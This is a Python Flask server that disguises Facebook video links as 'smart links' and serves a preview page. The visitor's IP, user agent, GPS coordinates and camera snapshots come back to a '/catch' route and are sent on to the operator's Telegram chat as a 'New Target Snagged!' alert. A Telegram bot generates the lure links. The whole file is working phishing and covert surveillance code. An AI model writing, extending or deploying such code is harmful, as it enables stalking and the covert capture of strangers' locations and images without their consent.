import os
import subprocess
import json
import base64
import requests
import threading
from urllib.parse import urlparse
from flask import Flask, request, render_template, jsonify
from dotenv import load_dotenv
from time import sleep

load_dotenv()

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
BASE_URL = os.environ.get("BASE_URL", "http://127.0.0.1:5000/")

app = Flask(__name__)

# --------------------- Video Info ---------------------
def get_video_info(url):
    try:
        result = subprocess.run(['yt-dlp', '--dump-json', '--no-warnings', url],
                                capture_output=True, text=True, check=True)
        video_data = json.loads(result.stdout)
        title = video_data.get('title', 'Video')
        thumbnail = video_data.get('thumbnail', '')
        if 'thumbnails' in video_data:
            thumbnails = video_data['thumbnails']
            best_thumb = next((t['url'] for t in reversed(thumbnails) if t.get('width') and t['width'] > 600), None)
            if best_thumb: thumbnail = best_thumb
            elif thumbnails: thumbnail = thumbnails[-1]['url']
        return title, thumbnail
    except Exception as e:
        print(f"Error fetching video info: {e}")
        return "Content loading...", "https://via.placeholder.com/640x360.png?text=Preview+Unavailable"

# --------------------- Telegram ---------------------
def send_to_telegram(data):
    if not TELEGRAM_BOT_TOKEN: return
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = data.get('userAgent', 'N/A')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy', 'N/A')

    message_text = f"🎯 **New Target Snagged!** 🎯\n\n"
    message_text += f"🌐 **IP:** `{ip_address}`\n"
    if latitude and longitude:
        message_text += f"📍 **Location:** `{latitude}, {longitude}` (Accuracy: {accuracy} m)\n"
        message_text += f"Map: [Google Maps](https://www.google.com/maps/search/?api=1&query={latitude},{longitude})\n"
    else:
        message_text += "📍 **Location:** `Permission Denied`\n"
    message_text += f"💻 **Device Info:** `{user_agent}`"

    images = data.get('images', [])
    if images:
        files = {}
        media = []
        for idx, img_b64 in enumerate(images):
            try:
                img_name = f'snapshot_{idx}.jpg'
                img_data = base64.b64decode(img_b64.split(',')[1])
                files[img_name] = (img_name, img_data, 'image/jpeg')
                media.append({'type': 'photo', 'media': f'attach://{img_name}',
                              'caption': message_text if idx == 0 else '', 'parse_mode': 'Markdown'})
            except Exception as e:
                print(f"Error decoding image {idx}: {e}")
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMediaGroup"
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'media': json.dumps(media)}
        try: requests.post(url, data=payload, files=files)
        except Exception as e: print(e)
    else:
        send_text_only_to_telegram(f"📸 **No images captured** 📸\n\n{message_text}")

def send_text_only_to_telegram(message, chat_id=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': chat_id or TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
    try: requests.post(url, data=payload)
    except Exception as e: print(e)

# --------------------- Flask Routes ---------------------
@app.route('/catch', methods=['POST'])
def catch_data():
    try:
        data = request.get_json()
        if 'image_b64' in data and 'images' not in data:
            data['images'] = [data.pop('image_b64')]
        send_to_telegram(data)
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        print(e)
        return jsonify({'status': 'error'}), 500

@app.route('/share/v/<post_id>/')
def smart_link(post_id):
    fb_url = f"https://www.facebook.com/share/v/{post_id}/"
    title, thumbnail = get_video_info(fb_url)
    return render_template('index.html', title=title, thumbnail=thumbnail, redirect_url=fb_url)

@app.route('/get_smart_link', methods=['POST'])
def get_smart_link():
    data = request.get_json()
    fb_url = data.get('fb_url')
    if not fb_url:
        return jsonify({'error': 'Missing fb_url'}), 400
    parsed = urlparse(fb_url)
    path_parts = parsed.path.strip('/').split('/')
    post_id = path_parts[-1] if path_parts else None
    if not post_id:
        return jsonify({'error': 'Cannot extract post_id'}), 400
    smart_link_url = f"{BASE_URL}/share/v/{post_id}/"
    return jsonify({'smart_link': smart_link_url}), 200

@app.route('/')
def index_root():
    return "<h1>Server is running. Use /share/v/&lt;post_id&gt;/</h1>", 200

# --------------------- Telegram Bot ---------------------
def telegram_bot():
    offset = None
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    while True:
        try:
            params = {'timeout': 30, 'offset': offset}
            resp = requests.get(url, params=params).json()
            for result in resp.get('result', []):
                offset = result['update_id'] + 1
                message = result.get('message', {})
                chat_id = message.get('chat', {}).get('id')
                text = message.get('text', '')

                # Check if message is a Facebook post link
                if 'facebook.com' in text:
                    parsed = urlparse(text)
                    parts = parsed.path.strip('/').split('/')
                    post_id = parts[-1] if parts else None
                    if post_id:
                        smart_link_url = f"{BASE_URL}/share/v/{post_id}/"
                        send_text_only_to_telegram(f"Here is your smart link:\n{smart_link_url}", chat_id=chat_id)
        except Exception as e:
            print("Telegram bot error:", e)
        sleep(1)

# --------------------- Start ---------------------
if __name__ == '__main__':
    threading.Thread(target=telegram_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
